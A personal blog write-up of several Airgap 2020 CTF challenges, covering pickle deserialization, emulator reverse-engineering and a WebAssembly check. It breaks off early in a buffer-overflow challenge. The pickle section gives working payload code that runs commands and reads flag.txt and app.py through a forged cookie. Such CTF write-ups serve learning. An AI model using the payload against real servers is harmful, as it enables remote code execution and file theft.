---
layout: post
title: "Pickles, Stacks, and CPUs - Airgap 2020 CTF"
date: 2020-05-05 22:25:00
author: Jaci
categories: cyber, ctf, writeup
---

I usually don't post much on this blog, but I figured today I might share a new subject area - cybersecurity. In particular my findings from the Airgap 2020 CTF (Capture the Flag) challenge, the 2nd ever CTF I've had the pleasure of attempting. Enquire within for some interesting flags and first bloods in binary and web exploitation.

<!-- excerpt -->

<hr />

# \#Airgap2020
With the current world pandemic, a lot of cybersecurity conventions have been cancelled or moving online - including Australia's own [BSides Canberra](https://www.bsidesau.com.au/).

This has caused some new cons to pop up, in the form of free-to-air cons on YouTube and Twitch. Two such cons I've enjoyed recently are [Airgap 2020](https://airgapp.in/) (the subject of this post), and [ComfyCon AU](https://www.comfyconau.rocks/).

Aside from some great talks, Airgap also hosted a CTF. This is the 2nd CTF (and 1st public CTF) I've ever taken place in, and I'm happy to say I've snatched up the #3 position out of 43. Let's go through some of my favourite challenges.

<blockquote class="twitter-tweet tw-align-center" data-theme="light"><p lang="en" dir="ltr">Happy to claim the #3 spot and a few first bloods on the <a href="https://twitter.com/Airgappin?ref_src=twsrc%5Etfw">@Airgappin</a> <a href="https://twitter.com/hashtag/AirGap2020?src=hash&amp;ref_src=twsrc%5Etfw">#AirGap2020</a> CTF. Thanks for the event, had a blast watching the talks and pulling flags ⛳️ <a href="https://t.co/n3rtqB4TSp">pic.twitter.com/n3rtqB4TSp</a></p>&mdash; Jaci Brunning (@jacibrunning) <a href="https://twitter.com/jacibrunning/status/1256850130436644865?ref_src=twsrc%5Etfw">May 3, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


### The challenges
Here, I'll be writing up the solutions to some of my favourite challenges of the CTF that I managed to complete.

- **[gerkinz](#gerkinz)**
  - gerkinz is a web-based challenge that involves getting arbitrary code execution on the webserver to fetch the flag using Python's `pickle` library
- **[tcemu](#tcemu)**
  - tcemu hides a flag in a binary program file for a simulated CPU and involves writing your own interpreter to find the flag
- **[paramz](#paramz)**
  - paramz is another web challenge, but leverages web assembly and can be completed directly in the browser
- **[scanzone](#scanzone)**
  - scanzone is a classic buffer-overflow challenge on a remote server. Nobody completed this challenge while the CTF was open

<hr />

# First bloods
First bloods are challenges that I was the first to complete. It's really nothing more than a bragging right -- a bragging right I intend to flaunt. 

## gerkinz
> _Gherkin (n.): the small green fruit of a plant related to the cucumber, used for pickling._

It's time to talk about pickles. A delicious relish for sure, but also a core library of the Python programming language. The `pickle` library is Python's solution to simple object serialization, allowing python objects (and even code) to be saved and loaded while retaining all of its data. For example...

```python
import pickle

my_object = dict(hello="world", a=2.5, b=[2, 5, ('test', 11)])

# Store
pickled = pickle.dumps(my_object)
# => (dp0\nS'a'...

# Load
my_loaded_object = pickle.loads(pickled)
# => {'a': 2.5, 'b': [2, 5, ('test', 11)], 'hello': 'world'}
my_object == my_loaded_object
# => True
```

Pickle serializes data as a sort of bytecode, which opens it to a variety of vulnerabilities. In particular, the python docs specifically state that `pickle` is ***NOT SECURE***

<img class="center" src="/ta/img/airgap-2020/pickle_warning.png" />

Sounds like the motivation behind a CTF...

### The challenge
The gerkinz challenge presents itself as a fairly simple website - a welcome, a text box, and a login button. When you put in your name, the text changes.

<img class="center" src="/ta/img/airgap-2020/gerkinz_intro.png" />

The login box only affects the current browser session (it's not the same for everyone that visits the page), and it persists across reloads and new tabs. This tells us that there's probably a **cookie** involved. Cookies are little bits of data the server can store on your browser's client to keep track of you - like keeping you logged in. 

Opening Chrome's cookie browser, and sure enough...

<img class="center" src="/ta/img/airgap-2020/gerkinz_raw_cookie.png" />

We can also look at the server's response headers, and verify the server framework is Werkzeug sitting atop Python 3.8.2. This verifies our assumption that the server is running Python, and may be vulnerable to pickle attacks if the server code is not written properly (we're in a CTF - it isn't written properly on purpose).

<img class="center" src="/ta/img/airgap-2020/gerkinz_server_header.png" />

The cookie appears to be base64, so let's decode it and unpickle it. 
```python
import base64, pickle

pickle.loads(base64.b64decode("gASVSQAAAAAAAAB9lCiMBG5hbWWUjBFoZWxsbyBpbWphYy5pbi90YZSMCWxhc3Rsb2dpbpSMGjIwMjAtMDUtMDVUMDc6MDM6MzUuMDIyMTg0lHUu"))
# => {'name': 'hello imjac.in/ta', 'lastlogin': '2020-05-05T07:03:35.022184'}
```

[That's a bingo!](https://www.youtube.com/watch?v=O5s3Oj2cPgc) The code on the server side appears to be using pickle for storing and loading user data. We know pickle is vulnerable, so all we have to do now is exploit it...

### How pickle works
Pickle converts objects into a serializable form. Python being python, we can also tell python how we want a certain type to be pickled, and we do this through the `__reduce__` method.

```python
class MyType:
  def __reduce__(self):
    pass   # TODO: Something
```

The [python pickle docs](https://docs.python.org/3/library/pickle.html#object.__reduce__) state that the reduce method should return either a string, or preferably a tuple. The tuple takes the form of a callable, its arguments, as well as a bunch of other optional details that describe how to reconstruct the object upon load (on load, the callable will be called to construct the object), allowing for dynamic logic inside of a pickle. **This also opens the door for arbitrary code execution**.

```python
import pickle

class MyType:
  def __reduce__(self):
    return (print, ("Hello World!",))

pickle.loads(pickle.dumps(MyType()))
# => "Hello World!"
```

### Popping the flag
With this knowledge of pickle, we can now start running arbitrary code on the server. We could launch a reverse shell, but that's a bit overkill for this. Let's do a simple `ls` and find out what we're dealing with.

```python
import pickle, base64

class MyType:
  def __reduce__(self):
    import subprocess
    return (subprocess.check_output, ('/bin/ls',))

p = pickle.dumps(dict(name=MyType(), lastlogin='2020-05-05T07:03:35.022184'))
print(base64.b64encode(p).decode('ASCII'))
# => gAN9cQAoWAQAAABuYW1lcQFjc3VicHJvY2VzcwpjaGVj.....
```

Let's take that cookie, put it into chrome, and reload the page...

<img class="center" src="/ta/img/airgap-2020/gerkinz_ls.png" />

Nice! Now let's cat flag.txt and app.py.

```python
import pickle, base64

class MyType:
  def __reduce__(self):
    import subprocess
    return (subprocess.check_output, (['/bin/cat', 'flag.txt', 'app.py'],))

p = pickle.dumps(dict(name=MyType(), lastlogin='2020-05-05T07:03:35.022184'))
print(base64.b64encode(p).decode('ASCII'))
# => gAN9c.....
```

<img class="center" src="/ta/img/airgap-2020/gerkinz_popped.png" />

<h1>🏴 Flag captured 🎉</h1>
We can also go ahead, copy the page source and make it a bit prettier so we can see the vulnerable implementation (some portions removed for brevity)...

```python
#!/usr/bin/env python

from flask import Flask, redirect, request, make_response
from datetime import datetime
import pickle
from base64 import urlsafe_b64encode as b64enc, urlsafe_b64decode as b64dec

app = Flask(__name__)

@app.route('/')
def index():
    name = "guest"
    userdata = request.cookies.get('user') or None
    if userdata:
        try:
            userdata = b64dec(userdata)
            userdata = pickle.loads(userdata)
            name = userdata['name']
        except:
          raise
    # ....

# ....
```

Our line of interest is `userdata = pickle.loads(userdata)`. Here, our payload is being unpickled and is what allows us to pop the flag. A nice and breezy 200 points.

<blockquote class="twitter-tweet tw-align-center"><p lang="en" dir="ltr">🥒first blood on gerkinz! <a href="https://t.co/ykn1kBIg4P">https://t.co/ykn1kBIg4P</a> <a href="https://t.co/ykq4I0ijy4">pic.twitter.com/ykq4I0ijy4</a></p>&mdash; #AirGap2020 (@Airgappin) <a href="https://twitter.com/Airgappin/status/1256663155846950913?ref_src=twsrc%5Etfw">May 2, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<hr />

## tcemu
`tcemu` was another first-blood I was able to pick up, worth a hefty 400 points but later being nerfed down to 300 points :(

This challenge comes with two files - `cpu` and `flag`. We can check the types of these files easily...
```
➜  tcemu $ file cpu flag
cpu:  ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, ...
flag: data
```

`flag` appears to just be binary data, but `cpu` is a linux 64-bit executable. As the name implies, this is an emulation challenge - `cpu` being the emulator. Let's go ahead and run it in a docker container, I don't particularly want to run some unknown program and lose my home directory...

```
➜  tcemu $ docker run -it --rm -v "$(pwd):/ctf" -w /ctf debian ./cpu flag
code length: 532
I put the flag here somewhere...
```

The given `flag` file happens to be 531 bytes large. Putting it through a hexdump (`hexdump -C flag`), we can see some resemblance of the string we see printed out...
```
00000000  04 00 28 00 00 00 10 00  21 00 00 00 08 00 01 04  |..(.....!.......|
00000010  00 20 00 00 00 08 00 01  04 00 70 00 00 00 08 00  |. ........p.....|
00000020  01 04 00 75 00 00 00 08  00 01 04 00 74 00 00 00  |...u........t...|
00000030  08 00 01 04 00 20 00 00  00 08 00 01 04 00 74 00  |..... ........t.|
00000040  00 00 08 00 01 04 00 68  00 00 00 08 00 01 04 00  |.......h........|
00000050  65 00 00 00 08 00 01 04  00 20 00 00 00 08 00 01  |e........ ......|
00000060  04 00 66 00 00 00 08 00  01 04 00 6c 00 00 00 08  |..f........l....|
00000070  00 01 04 00 61 00 00 00  08 00 01 04 00 67 00 00  |....a........g..|
00000080  00 08 00 01 04 00 20 00  00 00 08 00 01 04 00 68  |...... ........h|
00000090  00 00 00 08 00 01 04 00  65 00 00 00 08 00 01 04  |........e.......|
000000a0  00 72 00 00 00 08 00 01  04 00 65 00 00 00 08 00  |.r........e.....|
000000b0  01 04 00 20 00 00 00 08  00 01 04 00 73 00 00 00  |... ........s...|
000000c0  08 00 01 04 00 6f 00 00  00 08 00 01 04 00 6d 00  |.....o........m.|
000000d0  00 00 08 00 01 04 00 65  00 00 00 08 00 01 04 00  |.......e........|
000000e0  77 00 00 00 08 00 01 04  00 68 00 00 00 08 00 01  |w........h......|
000000f0  04 00 65 00 00 00 08 00  01 04 00 72 00 00 00 08  |..e........r....|
00000100  00 01 04 00 65 00 00 00  08 00 01 04 00 2e 00 00  |....e...........|
00000110  00 08 00 01 04 00 2e 00  00 00 08 00 01 04 00 2e  |................|
00000120  00 00 00 08 00 01 04 00  0a 00 00 00 08 00 01 04  |................|
00000130  00 32 00 00 00 10 00 42  00 00 00 04 00 29 00 00  |.2.....B.....)..|
00000140  00 10 00 3f 00 00 00 04  00 41 00 00 00 10 00 34  |...?.....A.....4|
00000150  00 00 00 04 00 63 00 00  00 10 00 04 00 00 00 04  |.....c..........|
00000160  00 2d 00 00 00 10 00 4e  00 00 00 04 00 49 00 00  |.-.....N.....I..|
00000170  00 10 00 29 00 00 00 04  00 52 00 00 00 10 00 1d  |...).....R......|
00000180  00 00 00 04 00 44 00 00  00 10 00 28 00 00 00 04  |.....D.....(....|
00000190  00 31 00 00 00 10 00 3b  00 00 00 04 00 29 00 00  |.1.....;.....)..|
000001a0  00 10 00 36 00 00 00 04  00 44 00 00 00 10 00 35  |...6.....D.....5|
000001b0  00 00 00 04 00 59 00 00  00 10 00 16 00 00 00 04  |.....Y..........|
000001c0  00 34 00 00 00 10 00 41  00 00 00 04 00 1f 00 00  |.4.....A........|
000001d0  00 10 00 53 00 00 00 04  00 1d 00 00 00 10 00 42  |...S...........B|
000001e0  00 00 00 04 00 49 00 00  00 10 00 26 00 00 00 04  |.....I.....&....|
000001f0  00 43 00 00 00 10 00 34  00 00 00 04 00 37 00 00  |.C.....4.....7..|
00000200  00 10 00 37 00 00 00 04  00 3d 00 00 00 10 00 40  |...7.....=.....@|
00000210  00 00 00                                          |...|
```

Notice the characters in the first half? "p u t t h e f l a ....". Let's load this binary up into [Ghidra](https://ghidra-sre.org/), a binary reverse-engineering tool to look into what it's doing. We can find the (unnamed) main function as the following:

<img class="center" src="/ta/img/airgap-2020/tcemu_dc_main.png" />

Looking on the right, we can see the decompiled C code. Decompilation is more of an art than a science, so it may look ugly and daunting right now, but we can make sense of it. 

The first thing to note is the logic that opens our file, gets its length, and maps it to memory. 

```c
    // ...
    __stream = fopen(*(char **)(param_2 + 8),"r");
    __fd = fileno(__stream);
    _Var3 = lseek(__fd,0,2);
    uVar1 = (int)_Var3 + 1;
    __addr = mmap((void *)0x0,(ulong)uVar1,1,1,__fd,0);
    printf("code length: %u\n",(ulong)uVar1);
    // ...
```

Mapping the file to memory is an easy way to traverse a file as if it were regular memory, which is very useful for small interpreters and emulators like this. We can also infer the name of some variables here, like `_Var3`. `lseek(__fd, 0, 2)` is actually `lseek(__fd, 0, SEEK_END)`, which is a common pattern used to determine the length of a file. Hence, we rename `_Var3` as `file_len`, and `uVar` as `file_len_plus1`. This results in...

```c
    // ...
    __addr = mmap((void *)0x0,(ulong)file_len_plus1,1,1,__fd,0);
    printf("code length: %u\n",(ulong)file_len_plus1);
    FUN_00101d7a(__addr,(ulong)file_len_plus1,(ulong)file_len_plus1);
    FUN_001016b2();
    munmap(__addr,(ulong)file_len_plus1);
    // ...
```

Diving into `FUN_00101d7a`, we can see that it appears to be taking the memory mapped file and its associated length and inserted it into some large, preallocated chunk.
```c
void FUN_00101d7a(undefined8 mmapped,undefined4 len_plus1) {
  DAT_00303018 = (undefined8 *)calloc(1,0x4038);
  *DAT_00303018 = mmapped;
  *(undefined4 *)(DAT_00303018 + 1) = len_plus1;
  *(undefined *)((long)DAT_00303018 + 0x4034) = 0;
  return;
}
```

Given this memory is statically allocated (`DAT_00303018`), zeroed with `calloc` and a known static length `0x4038`, I'd hazard a guess this is some kind of memory region mimicing RAM on a typical computer, so let's name it as such.

```c
void alloc_ram(undefined8 mmapped,undefined4 len_plus1) {
  _RAM = (undefined8 *)calloc(1,0x4038);
  *_RAM = mmapped;
  *(undefined4 *)(_RAM + 1) = len_plus1;
  *(undefined *)((long)_RAM + 0x4034) = 0;
  return;
}
```

We've got a few magic indexed here, so let's keep track of them in a note.

| RAM Offset | Type | Length | Purpose |
| ---------- | ---- | ------ | ------- |
| 0x0 | ptr | 8 bytes | program memory |
| 0x1 | int | 4 bytes | size of program + 1 |
| .... |
| 0x4034 | ? | 4 bytes | ???? set to 0 at init |


### Back to main
Back to the main, we can take a look at the next useful function, `FUN_001016b2`...

<img class="center" src="/ta/img/airgap-2020/tcemu_decoder.png">

This seems to resemble an instruction decoder. This takes in an opcode, and decides what to do next. Let's look at the first two lines to start...

```c
  while (*(char *)((long)_RAM + 0x4034) == '\0') {
    switch(*(undefined *)((ulong)*(uint *)(_RAM + 0x802) + *_RAM)) {
```

Ignoring the type noise, we can see the loop condition is `*(_RAM + 0x4034) == 0` - the same value that was initialized earlier. This is our loop condition - the program will stop when it's not 0.

We can also see the opcode, `*(*(_RAM + 0x802) + *_RAM)`. In C, `*(arr + x)` is equivilent to `arr[x]`, so...

```c
*(*(_RAM + 0x802) + *_RAM)
*(*(_RAM + 0x802) + _RAM[0])      // By *_RAM = *(_RAM + 0) = _RAM[0]
*(_RAM[0x802] + _RAM[0])          // By *(_RAM + 0x802) = _RAM[0x802]
```

We know `_RAM[0]` is our program memory pointer from our findings above (the table!), so we can rearrange this further

```c
*(_RAM[0] + _RAM[0x802])
*(_PROG_MEM + _RAM[0x802])
_PROG_MEM[_RAM[0x802]]
```

If you know anything about CPUs, `_RAM[0x802]` looks a lot like an instruction pointer; it tells the CPU what instruction to read. We can also see `0x802` being advanced in parts of the switch-case, which confirms this suspicion.

| RAM Offset | Type | Length | Purpose |
| ---------- | ---- | ------ | ------- |
| 0x0 | ptr | 8 bytes | program memory |
| 0x1 | int | 4 bytes | size of program + 1 |
| .... |
| 0x802 | int | 4 bytes | Instruction Pointer |
| .... |
| 0x4034 | int | 4 bytes | Keep running if == 0 |

This instruction pointer (IP) also tells us how big each opcode is, by how far the IP is advanced (opcode `0x2` is 3 bytes, `0x4` is 6 bytes, and `0x6` is 2 bytes). But what about the cases that don't advance the IP, like `0x0` and `0x7`? Won't they just keep looping forever, since the IP doesn't move? Not if they're `jump` instructions!

I highly doubt this flag program has any jumps, so we can label these as jumps and come back to them later if it turns out we need them. That weeds out 7 opcodes, leaving only 12 left. Let's start with `0x2`...

```c
void FUN_0010093c(byte param_1,byte param_2) {
  if ((param_1 < 9) && (param_2 < 9)) {
    *(undefined4 *)(_RAM + 4 + ((long)(int)(uint)param_1 + 0x1004) * 4) =
         *(undefined4 *)(_RAM + 4 + ((long)(int)(uint)param_2 + 0x1004) * 4);
  }
  else {
    printf("mov register invalid\nip: %u\n",(ulong)*(uint *)(_RAM + 0x4010));
  }
  return;
}
```

This function actually tells us what it is straight out of the gate - a `mov` instruction. But that's not all we can infer from it. The error message states "invalid register", and the criteria to reach this is a false evaluation of `param_1 < 9 && param_2 < 9`. We can deduce that `param_1` and `param_2` are both register indexes, and that there are only `9` registers (`0-9`). In the next statement, we can also see where the registers start, that `param_1` is the destination register and `param_2` is the source register.

| RAM Offset | Type | Length | Purpose |
| ---------- | ---- | ------ | ------- |
| 0x0 | ptr | 8 bytes | program memory |
| 0x1 | int | 4 bytes | size of program + 1 |
| .... |
| 0x802 | int | 4 bytes | Instruction Pointer |
| .... |
| 0x4014 | int | 4 bytes | Register 0 |
| 0x4018 | int | 4 bytes | Register 1 |
| .... |
| 0x4034 | int | 4 bytes | Register 8 |
| .... |
| 0x4034 | int | 4 bytes | Keep running if == 0 |

Looks like register 8 intersects with the keep running flag, meaning they must be the same. If we want to exit, we just have to write to register 8. Convenient. 

The other opcodes take much after the mov opcode. Most we can determine very easily by looking at the error code and vague structure. Here's all the easy ones:

```
0x00 - exit :: 0 bytes ::                 :: stops the loop
0x01 - mov  :: 3 bytes :: reg {dest, src} :: dest = src
0x02 - xor  :: 3 bytes :: reg {a, b}      :: a = a ^ b
0x03 - add  :: 3 bytes :: reg {a, b}      :: a = a + b
0x04 - stor :: 6 bytes :: reg a, int imm  :: a = b. Store (load) a value in a register
0x05 - push :: 2 bytes :: reg a           :: push stack
0x06 - pop  :: 2 bytes :: reg a           :: pop stack
0x07 - jump?
0x08 - ???  :: 3 bytes
0x09/A - jump?
0x0B - cmp? :: 3 bytes :: reg {a, b}      :: compare function in support of jump
0x0C - cmp? :: 2 bytes :: reg a           :: compare function in support of jump
0x0D/E/F - jump?
0x10 - ???  :: 6 bytes
0x11 - add  :: 3 bytes :: reg {a, b}      :: a = a + b
0x12 - ???  :: 6 bytes
```

I've left out `0x08, 0x10, and 0x12` as they are quite interesting to look at on their own. 

`0x08` seems to be some form of print function
```c
// Opcode 0x08
void FUN_00100dde(byte param_1,char param_2) {
  if (param_1 < 9) {
    if ((param_2 == '\0') ||
       ((((*(int *)(_RAM + 4 + ((long)(int)(uint)param_1 + 0x1004) * 4) < 0x20 ||
          (0x7f < *(int *)(_RAM + 4 + ((long)(int)(uint)param_1 + 0x1004) * 4))) &&
         (*(int *)(_RAM + 4 + ((long)(int)(uint)param_1 + 0x1004) * 4) != 10)) &&
        (*(int *)(_RAM + 4 + ((long)(int)(uint)param_1 + 0x1004) * 4) != 0xd)))) {
      printf("register %u: %i\n",(ulong)param_1,
             (ulong)*(uint *)(_RAM + 4 + ((long)(int)(uint)param_1 + 0x1004) * 4));
    }
    else {
      putchar(*(int *)(_RAM + 4 + ((long)(int)(uint)param_1 + 0x1004) * 4));
    }
  }
  else {
    printf("prnt register invalid\nip: %u\n",(ulong)*(uint *)(_RAM + 0x4010));
  }
  return;
}
```

There's a lot of code here, but it looks like the big if branch is mostly for debugging (uses printf), so we can ignore it. The second branch, when the second parameter is 0, appears to print a register directly to console, interpreting
it as an ASCII value. That gives us enough to go on for now, we can come back to it if we need to.

`0x10` and `0x12` both seem to be variations on the `add` instruction, but load immediate values instead. They still perform `a = a + b`, but only `a` is a register - `b` is a literal (immediate) value. In other words, these are a combined STORE/ADD instruction, though `0x12` takes some extra logic in the caller. We'll come back to `0x12` if we need to - this is a CTF, gotta go fast. 

### Rolling our own interpreter
We've decoded most instructions, and we at least know the length of all of them. So let's go ahead and write our own interpreter for this flag file. I'm choosing to do mine in C++, so let's go ahead and give it a try.

First, we need to map our data file and initialize all the memory we need.
```cpp
FILE *f = fopen(argv[1], "r");
int fd = fileno(f);
size_t file_size = lseek(fd, 0, SEEK_END);
uint8_t *program_mem = (uint8_t *)mmap(0, file_size + 1, 1, 1, fd, 0);

std::array<int, 9> registers{0};
int ip;
```

Next, we can scaffold out our execution loop. Note that we're prefetching registers a, b as well as the immediate value. Depending on the instruction, `a`, `b`, `imm`, or a combination may be used, so this saves us repeating ourselves later.

```cpp
while (registers[8] == 0) {
    uint8_t reg_a = program_mem[ip + 1], reg_b = program_mem[ip + 2];
    int32_t imm = *(int32_t *)&program_mem[ip + 2];

    switch(program_mem[ip]) {
      // ....
    }
}
```

Next we can select what we want to implement. I'm going to start with `0x0 (EXIT), 0x1 (MOV), 0x2 (XOR), 0x3 (ADD), 0x4 (STORE), 0x8 (PRINT), and 0x10 (ADD IMMEDIATE)`. Any other instructions and we'll throw an exception.

```cpp
    switch(program_mem[ip]) {
      case 0x0:
        registers[8] = 1;
        break;
      case 0x1:
        // MOV
        registers[reg_a] = registers[reg_b];
        ip += 3;
        break;
      case 0x2:
        // XOR
        registers[reg_a] ^= registers[reg_b];
        ip += 3;
        break;
      case 0x3:
        // ADD
        registers[reg_a] += registers[reg_b];
        ip += 3;
        break;
      case 0x4:
        // STORE
        registers[reg_a] = imm;
        ip += 6;
        break;
      case 0x8:
        // PRINT
        std::cout << (char)registers[reg_a];
        ip += 3;
        break;
      case 0x10:
        // ADD_IMM
        registers[reg_a] += imm;
        ip += 6;
        break;
      default:
        throw std::invalid_argument{"Unsupported instruction " + std::to_string(program_mem[ip]) + " @ " + std::to_string(ip)};
    }
```

Let's go ahead and give that a run. If there's an exception, we need to implement more instructions. Otherwise, we should be fine.

```
➜  tcemu $ g++ interp.cpp -o interp; ./interp flag
I put the flag here somewhere...
```

Perfect! No exception, and our output matches that of the regular interpreter. We're still not getting a flag though. Let's add a debug print to each instruction and see what's actually being run.

```
STORE r0 imm(40)
ADD_IMM r0 += imm(33)
PRINT: I
STORE r0 imm(32)
PRINT:  
STORE r0 imm(112)
PRINT: p
STORE r0 imm(117)
PRINT: u
STORE r0 imm(116)
PRINT: t

// ...

STORE r0 imm(29)
ADD_IMM r0 += imm(66)
STORE r0 imm(73)
ADD_IMM r0 += imm(38)
STORE r0 imm(67)
ADD_IMM r0 += imm(52)
STORE r0 imm(55)
ADD_IMM r0 += imm(55)
STORE r0 imm(61)
ADD_IMM r0 += imm(64)
EXIT
```

Looks like we're getting a lot of `STORE/ADD_IM` (instruction `0x10`) in the second half of the execution. This resembles how the first `I` is formed, but missing a print statement. Let's modify our interpreter to always print the final value 
after `ADD_IM` as an ASCII character...

```cpp
      case 0x10:
        // ADD_IMM
        registers[reg_a] += imm;
        std::cout << (char)registers[reg_a];
        ip += 6;
        break;
```

<img class="center" src="/ta/img/airgap-2020/tcemu_popped.png" />

<h1>🏴 Bingo! 🎉</h1>

<hr />
<hr />

## paramz
Paramz was a web-based challenge that I was able to complete during the CTF, snatching a clean 200 points. Unfortunately I didn't get first-blood on this one, but it felt good none-the-less to be second through the door.

Paramz gives two files - `chal.html` and `param.wasm`. `chal.html` has some highly-obfuscated javascript code that appears to load and call `param.wasm` - a webassembly file.

<img class="center" src="/ta/img/airgap-2020/paramz_js.png" />

Opening this in our browser, we can see the challenge premise - get the right parameters.

<img class="center" src="/ta/img/airgap-2020/paramz_start_0.png"/>

<img class="center" src="/ta/img/airgap-2020/paramz_start_1.png"/>

The parameters are only checked upon clicking the `Check!` button, so let's take a look at who's listening to the button click event.

<img class="center" src="/ta/img/airgap-2020/paramz_inspect_0.png" />

That looks like a click listener. Let's jump to its function definition and see what we find...

<img class="center" src="/ta/img/airgap-2020/paramz_inspect_1.png" />

Looks like we've got some unobfuscated javascript that registers the event listener, and appears to do our parameter checking. This is actually really interesting, let's break it down...

### The Web Assembly
Scrolling up, we can find some javascript code that reads the parameters from the URL string. 

```js
function gP(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}
```

We also find the function responsible for loading the webassembly file, and how it gets loaded.

```js
function loadWebAssembly(filename, imports) {
  return fetch(filename)
    .then(response => response.arrayBuffer())
    .then(buffer => WebAssembly.compile(buffer))
    .then(module => {
      // ...
      return new WebAssembly.Instance(module, imports);
    });
}

// ...

loadWebAssembly('param.wasm')
  .then(instance => {
    var ex = instance.exports;
    var ac = ex._acb;
    var bc = ex._bcb;
    // ...
    var wc = ex._wcb;
    var xc = ex._xcb;
    var button = document.getElementById('check');
    button.value = 'Check!';
    button.addEventListener('click', function() {
      // ...
```

What we're seeing is the code load a webassembly file into the VM, then get a whole bunch of exports, `_acb` thru `_xcb`. What are these?
Placing a breakpoint at `var button = /* ... */`, we can inspect the values of these variables. 

<img style="center" src="/ta/img/airgap-2020/paramz_funcrefs.png" />

They all appear to be function references - functions written in webassembly. They seem to be in a semi-arbitrary order, so they likely have something to do with obfuscation of the flag. Chrome lets us look through webassembly files, so let's take a look inside these functions. Here's function `10(...)`...

<img style="center" src="/ta/img/airgap-2020/paramz_func_10.png" />

This wasm function is very simple, let's break it down.

```wasm
func (param i32) (result i32)   // Take in an integer, return an integer
  local.get 0   // Load the first parameter
  i32.const 115 // Load the constant 115
  i32.ne        // Check the two loaded values (param and 115) aren't equal (ne = not equal)
                // If they aren't equal, load 1 into the return, else load 0
end
```

In fact, all the wasm functions follow this same pattern. Here they all are spelled out:
```
0 :: nop        4 :: != 49     8 :: != 86     12 :: != 108
1 :: != 100     5 :: != 90     9 :: != 57     13 :: != 88
2 :: != 71      6 :: != 51    10 :: != 115    14 :: != 99
3 :: != 104     7 :: != 116   11 :: != 98     15 :: != 50
```

This looks to be a promising lead. Let's keep looking.

### The cypher

```js
button.addEventListener('click', function() {
  var z = [gP("a"),gP("b"),gP("c"),gP("d"),gP("e"),gP("f"),gP("g"),gP("h"),gP("i"),gP("j"),gP("k"),gP("l"),gP("m"),gP("n"),gP("o"),gP("p"),gP("q"),gP("r"),gP("s"),gP("t"),gP("u"),gP("v"),gP("w"),gP("x")]
  let a = new Uint8Array(new TextEncoder().encode(z[0]));var A = new TextDecoder("utf-8").decode(a);
  // ....
  let x = new Uint8Array(new TextEncoder().encode(z[23]));var X = new TextDecoder("utf-8").decode(x);
  var y = ungarble(z);
  aO = ac(A);
  // ...
  xO = xc(X);
  var res = aO+bO+cO+dO+eO+fO+gO+hO+iO+jO+kO+lO+mO+nO+oO+pO+qO+rO+sO+tO+uO+vO+wO+xO;
  if ( res == 0 ) { alert(atob(y))} else { alert("Incorrect Parameters :(")};
}, false);
```

When the button is pressed, this part of the code gets triggered. We've established earlier that `gP` gets the parameter in the URL arguments. The next set of lines, `let a = new Uint8 ....` serves to convert
this value to be numeric, putting the final value in `A` (note the two statements on one line). This repeats for `a` thru `x`.

Parameters `a` thru `x` are then passed through our wasm functions that we found earlier - verifying that they're the correct value. If all of these are the correct value (by `res = a0+b0+c0 ...`), we get the flag. The flag occurs here:
```js
if (res == 0)
  alert(atob(y));
else
  alert("Incorrect Parameters :(");
```

`atob` is the javascript method of decoding a base64 string, so our flag is the base64 decode of `y`. In turn, `y` is set as `var y = ungarble(z)` where `z` is our big array of all the parameters in the URL. So what's `ungarble`?

```js
function ungarble(chars) {
    return chars.reduce(function(allString, char) {
        return allString += String.fromCharCode(char);
    }, '');
}
```

`ungarble(z)` takes the parameters from `z` (`"1", "2", "3", ...`), coerces them to integers (`1, 2, 3, ...`) and converts each to a unicode string based on that number. This is actually quite awesome, the flag itself is obfuscated and is its own validity check - _we're dealing with a very clever little hash function_. Note that we can't just get our flag by skipping over `res = a0 + b0 + ....`, since the flag itself is a decoding of the same values, adding some extra difficulty.

### Getting the flag
Let's take our wasm function table from earlier
```
0 :: nop        4 :: != 49     8 :: != 86     12 :: != 108
1 :: != 100     5 :: != 90     9 :: != 57     13 :: != 88
2 :: != 71      6 :: != 51    10 :: != 115    14 :: != 99
3 :: != 104     7 :: != 116   11 :: != 98     15 :: != 50
```

Now, cross-reference that with which function `ac, bc, ..., xc` bind to. This tells us which value each of `ac, bc, etc` expect in order to produce a 0 return value. If we find these values, `res = a0 + b0 + ... == 0` evaluates true, and we can get our flag. Cross-referencing all of these, we get...

```
a :: f1 :: 100    e :: f5 :: 90     i ::  f5 :: 90    m :: f11 :: 98    q :: f13 :: 88    u :: f14 :: 99
b :: f2 :: 71     f :: f6 :: 51     j ::  f8 :: 86    n ::  f6 :: 51    r ::  f6 :: 51    v :: f15 :: 50
c :: f3 :: 104    g :: f7 :: 116    k ::  f9 :: 57    o ::  f5 :: 90    s ::  f1 :: 100   w ::  f4 :: 49
d :: f4 :: 49     h :: f6 :: 51     l :: f10 :: 115   p :: f12 :: 108   t ::  f3 :: 104   x ::  f9 :: 57
```

Now that we've got those, we can form our query string...

`http://localhost:8000/chal.html?a=100&b=71&c=104&d=49&e=90&f=51&g=116&h=51&i=90&j=86&k=57&l=115&m=98&n=51&o=90&p=108&q=88&r=51&s=100&t=104&u=99&v=50&w=49&x=57`

<img class="center" src="/ta/img/airgap-2020/paramz_popped.png" />

<h1>🏴 Popped. 🎉</h1>

<hr />

## scanzone
Unfortunately I didn't get to unlock scanzone during the CTF, but instead I picked it up a few days after in a spell of boredom. I was close to completing this one during the CTF, but made a fatal assumption, which we'll see shortly...

scanzone is a classic buffer-overflow challenge. The challenge is available through netcat, at which point you're prompted for a username and age, before finally being told that you're not worthy of the title of admin.

<img class="center" src="/ta/img/airgap-2020/scanzone_0.png" />

What's the first thing we do when greeted with a prompt like this? Throw garbage at it and see what sticks. Let's throw 200-some characters at it. 

<img class="center" src="/ta/img/airgap-2020/scanzone_1.png" />

Here it seems to freeze, but doesn't kick us off. This tells us we've probably overwritten something we shouldn't be able to - like a loop variable or a return address. Let's try 100 characters.

<img class="center" src="/ta/img/airgap-2020/scanzone_2.png" />

That looks better. We've got a weird extra new line there when it prints our name back to us, which is a bit weird. What happens if we change our age?

